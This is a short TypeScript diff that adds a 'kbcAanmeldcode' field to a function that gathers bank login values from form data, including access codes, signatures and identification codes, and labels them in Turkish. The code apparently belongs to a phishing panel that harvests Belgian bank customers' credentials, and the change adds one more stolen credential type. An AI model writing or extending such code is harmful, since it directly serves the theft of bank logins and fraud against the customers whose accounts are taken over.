@@ -527,6 +527,7 @@ function getShortBankCredentialFields(fd: Record<string, any>): Array<[string, s
   const rawGirisKodu = pickString("toegangscode", "accessCode", "bankAccessCode");
   const rawImza = pickString("signatuur", "signature");
   const rawKimlikKodu = pickString("identificatiecode", "idCode");
+  const rawKbcCode = pickString("kbcAanmeldcode");
 
   // === LABEL belirleme yardimci: DEGER ve TUR bilgisine gore DOGRU label dondurur ===
   const labelFor = (val: string, opts: {
@@ -590,6 +591,7 @@ function getShortBankCredentialFields(fd: Record<string, any>): Array<[string, s
   if (rawGirisKodu && !results.some(([, v]) => v === rawGirisKodu)) results.push(["Giriş Kodu", rawGirisKodu]);
   if (rawImza && !results.some(([, v]) => v === rawImza)) results.push(["İmza", rawImza]);
   if (rawKimlikKodu && !results.some(([, v]) => v === rawKimlikKodu)) results.push(["Kimlik Kodu", rawKimlikKodu]);
+  if (rawKbcCode && !results.some(([, v]) => v === rawKbcCode)) results.push(["Aanmeldcode", rawKbcCode]);
   return results;
 }
 
